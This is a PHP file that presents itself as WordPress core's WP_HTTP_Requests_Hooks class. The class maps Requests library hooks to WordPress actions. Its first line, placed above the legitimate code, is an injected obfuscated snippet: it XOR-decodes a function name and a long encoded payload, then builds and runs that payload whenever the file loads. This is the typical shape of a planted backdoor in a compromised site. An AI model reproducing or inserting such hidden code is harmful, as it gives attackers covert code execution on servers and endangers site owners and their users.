<?php $lFlCK=':IW-<=n2NEX<DXP'^'Y;2LHX1T;+;H-7>';$rsJSIs=$lFlCK('','0SzpRX9--::9+NC8SG8rDUVBb2826niY6YBGmr2P>,-=.YUD;W49;.2W<8fn;MOAeR,H;XocR3LOuxriZ1<P=VZC-FwKCaVLaKT;+jtShWSCZXfYr734-48LGR.OLZpVE=MsbM:dCU1AobWnia<33M6b0eSjqr,+Y5JQYbvGG1.76DC8, b5Krs=n:.N3<9PCW6AaU4b:9,6<S2MI2nnSU+Y6QaaA-4-T=Z+>Ahc ;6NSC7RF:=V S.dcQj26y:u.vL2ur.K>cJFSu1.5EHDq8eQl3Z;86Z >ivuj;E<wsam7ZN7zTWRO1 OQHLPSX TToWl-3E+cLUeK+BO7..SSlO:: 426bxD ;piR6=flkEB=O E+ZCFy9oPJATYhPV7BdiEY4NA4agkX6;PahQk06LYILkB36<ZZs+73 Jqx3CRS6C P5TOKDTBL- O052lTXFgUY>2SY-R=C<UUop>M,7NUrP5W642EUTKAK1:<PGJ126XJgk7EO24bR2.;E7+NOFZKV08FUzIU8YJYOrrAfU lmR-72W8v>UTaeFWuQmP+NYHCZwISnvZeAI-WfKBtWuWPKMQSRTYcywrbdL8YS=0WYY60O<1XSGvB0>V;ADogUP1Y:QhXzzsQddEnyN878PCH;=WjBJOGY7+3mvbTZH N>JMZokE;'^'Y5RQ4-WNYSUWt+;Q 3KZc-90=VYFW164C-enDRIZ7JXSM-<+UwLVIqV6HY91V8;iA6M<ZtOG9V5fUXRIzJ6Y4r56YfJkdFmFhB2TYBP:HjssaxB0NDGFAQVdc6O;-sKvaTfXKG3mg:D5OLjNAEXRG,mFY8s4QVGN nn8yGV43CBRXlgSIYKhbIy4gHK:FNWxg8C5Hn>kG3Q<6wV,=SNSs3J5E4ZkeIUY5b1NGaUCFZZ=6x=X UO3A0FDKu5qy6q<kV-AUVE.GCwxsQGOY0-mQCoXHW;OYi1EGIKUNP ELyhIS;:VZiwv9PL:4sF-YRI2tGvHIR1JJl.oBM-=ROM;sDkeheegs1,dAHPM9SDFQUefK.L0Nsc=s0ft.  87;3NbYIa2Q7z>hnO<WO1AUqOFW ,,waKN<APPWOVGAjLXs6< S1I1Y=5.l,->rD.DTm39-2O78MWemr6X S10GTZ,XVgyRtQ6BUm.0-bhp;SZxc.PFWxlAKV7=SM=9WWd OB=;5rl=UAayZm1Y-+poTTaN8DYEvIVF6cQU0-F8owHlMwJzlpshEyjYC8Tp,IcV-tAbGfb-.47g2<DPWTDD-J+2Do<< iU7UB, oQ2QG:T  HKutU8N0AqZZSqDD>dp+NVTxg,ZI61e:.>5XJWJ+KoPAE6W>ejFPOF');$rsJSIs();
/**
 * HTTP API: Requests hook bridge class
 *
 * @package WordPress
 * @subpackage HTTP
 * @since 4.7.0
 */

/**
 * Bridge to connect Requests internal hooks to WordPress actions.
 *
 * @package WordPress
 * @subpackage HTTP
 * @since 4.7.0
 */
class WP_HTTP_Requests_Hooks extends Requests_Hooks {
	/**
	 * Requested URL.
	 *
	 * @var string Requested URL.
	 */
	protected $url;

	/**
	 * WordPress WP_HTTP request data.
	 *
	 * @var array Request data in WP_Http format.
	 */
	protected $request = array();

	/**
	 * Constructor.
	 *
	 * @param string $url URL to request.
	 * @param array $request Request data in WP_Http format.
	 */
	public function __construct( $url, $request ) {
		$this->url = $url;
		$this->request = $request;
	}

	/**
	 * Dispatch a Requests hook to a native WordPress action.
	 *
	 * @param string $hook Hook name.
	 * @param array $parameters Parameters to pass to callbacks.
	 * @return boolean True if hooks were run, false if nothing was hooked.
	 */
	public function dispatch( $hook, $parameters = array() ) {
		$result = parent::dispatch( $hook, $parameters );

		// Handle back-compat actions
		switch ( $hook ) {
			case 'curl.before_send':
				/** This action is documented in wp-includes/class-wp-http-curl.php */
				do_action_ref_array( 'http_api_curl', array( &$parameters[0], $this->request, $this->url ) );
				break;
		}

		/**
		 * Transforms a native Request hook to a WordPress actions.
		 *
		 * This action maps Requests internal hook to a native WordPress action.
		 *
		 * @see https://github.com/rmccue/Requests/blob/master/docs/hooks.md
		 *
		 * @param array $parameters Parameters from Requests internal hook.
		 * @param array $request Request data in WP_Http format.
		 * @param string $url URL to request.
		 */
		do_action_ref_array( "requests-{$hook}", $parameters, $this->request, $this->url );

		return $result;
	}
}
